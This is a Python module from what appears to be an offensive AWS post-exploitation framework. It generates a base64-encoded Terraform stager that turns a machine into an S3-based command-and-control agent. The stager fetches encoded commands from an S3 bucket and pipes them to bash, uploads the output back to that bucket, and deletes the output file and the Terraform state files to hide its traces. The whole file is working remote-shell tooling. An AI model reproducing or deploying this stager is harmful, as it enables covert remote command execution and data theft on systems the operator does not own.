import base64
import string
import random
import sys

import mongoengine

from core.database.models import S3C2Listener, S3C2Particle

author = {
    "name": "gl4ssesbo1",
    "twitter": "https://twitter.com/gl4ssesbo1",
    "github": "https://github.com/gl4ssesbo1",
    "blog": "https://www.pepperclipp.com/"
}

needs_creds = False

variables = {
    "SERVICE": {
        "value": "none",
        "required": "true",
        "description": "The service that will be used to run the module. It cannot be changed."
    },
    "LISTENER-BUCKET-NAME": {
        "value": "",
        "required": "true",
        "description": "The listener bucket name to use as C2."
    },
    "OUTPUT-FILE-NAME": {
        "value": "",
        "required": "true",
        "description": "The name of the output file to be dumped inside ./stager directory."
    }
}
description = "The TCP Reverse Shell that is used by listeners/aws_python_tcp_listener"

aws_command = "None"

def python_code_generate(bucket, accesskey, secretkey, region, commandkey, outputkey, kmskey):
    particle_name = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(10))
    tfcode = """
terraform {
  required_providers {
    curl = {
      source = "anschoewe/curl"
      version = "1.0.2"
    }
    sys = {
      source = "mildred/sys"
      version = "1.3.38"
    }
  }
}

provider "sys" {}

data "sys_os_release" "os" {}


    """
    tfcode += f"""
provider "aws" {{
  region     = "{region}"
  access_key = "{accesskey}"
  secret_key = "{secretkey}"
}}

resource "random_string" "random" {{
  length           = 10
  special          = false
}}

locals {{
  particle_name = fileexists("./.particle") ? file("./.particle") : random_string.random.result
}}

resource "null_resource" "rev_shell" {{
  depends_on = [
    aws_s3_object.particle_dir,
    data.aws_s3_object.particle_file
  ]
  provisioner "local-exec" {{
    command = "data=$(echo ${{data.aws_s3_object.particle_file.body}}); if [ $(echo $data | base64 -d | wc -m) -gt 0 ]; then echo $data | base64 -d | bash 1>/tmp/output.txt 2>>/tmp/output.txt; else touch /tmp/output.txt; fi"
  }}
}}

resource "aws_s3_object" "particle_dir" {{
  depends_on = [
    local_file.command_file
  ]
  count = fileexists("./.particle") ? 0 : 1
  bucket = "testbucketbucketdhasjdkasdasddas"
  key = "${{local.particle_name}}/"
  kms_key_id = "{kmskey}"
}}

resource "local_file" "particle_file" {{
  depends_on = [
    aws_s3_object.particle_dir
  ]
    count = fileexists("./.particle") ? 0 : 1
    content  = "${{local.particle_name}}"
    filename = "./.particle"
}}

resource "local_file" "command_file" {{
    count = fileexists("./.particle") ? 0 : 1
    content  = ""
    filename = "/tmp/command.txt"
}}

data "aws_s3_object" "particle_file" {{
    depends_on = [
      local_file.particle_file,
      aws_s3_object.particle_dir
    ]
    bucket = "{bucket}"
    key = "${{local.particle_name}}/{commandkey}"
}}

resource "aws_s3_object" "command_object" {{
  depends_on = [
    null_resource.rev_shell,
    aws_s3_object.particle_dir,
    data.aws_s3_object.particle_file,
    local_file.command_file
  ]
  key    = "${{local.particle_name}}/{commandkey}"
  bucket = "{bucket}"
  source = "/tmp/command.txt"
  kms_key_id = "{kmskey}"
}}

resource "aws_s3_object" "output_object" {{
  depends_on = [
    null_resource.rev_shell,
    aws_s3_object.particle_dir,
    data.aws_s3_object.particle_file,
  ]
  key    = "${{local.particle_name}}/{outputkey}"
  bucket = "testbucketbucketdhasjdkasdasddas"
  source = "/tmp/output.txt"
  kms_key_id = "arn:aws:kms:us-east-1:621042647096:key/a8770df0-57d0-4524-8b2e-76736298b116"
}}

resource "null_resource" "rm_output" {{
  depends_on = [
    aws_s3_object.output_object,
    null_resource.rev_shell,
    aws_s3_object.particle_dir,
    data.aws_s3_object.particle_file,
  ]
  provisioner "local-exec" {{
    command =  "rm -rf /tmp/output.txt ./terraform.tfstate*; touch /tmp/output.txt;"
  }}
}}
    """

    tfcodeB64 = tfcode.encode("ascii")
    b64Bytes = base64.b64encode(tfcodeB64)

    return b64Bytes
def exploit(workspace):
    bucket = variables['LISTENER-BUCKET-NAME']['value']
    try:
        s3c2data = S3C2Listener.objects.get(listener_bucket_name=bucket)

    except mongoengine.DoesNotExist:
        return {"error": "Listener does not exist. Create it first plase."}

    accesskey = s3c2data['listener_particle_access_key']
    secretkey = s3c2data['listener_particle_secret_key']
    region = s3c2data['listener_region']
    outputfile = s3c2data['listener_output_file']
    commandkey = s3c2data['listener_command_file']
    kmskey = s3c2data['listener_kms_key_arn']

    b64Bytes = python_code_generate(
        bucket=bucket, accesskey=accesskey, secretkey=secretkey, region=region, commandkey=commandkey, outputkey=outputfile, kmskey=kmskey
    )

    return {
        "ModuleName": {
            "ModuleName": "Terraform for S3 C2",
            "Status": "Successfully created",
            "Code": b64Bytes.decode(),
            "OutPutFile": outputfile
        }
    }

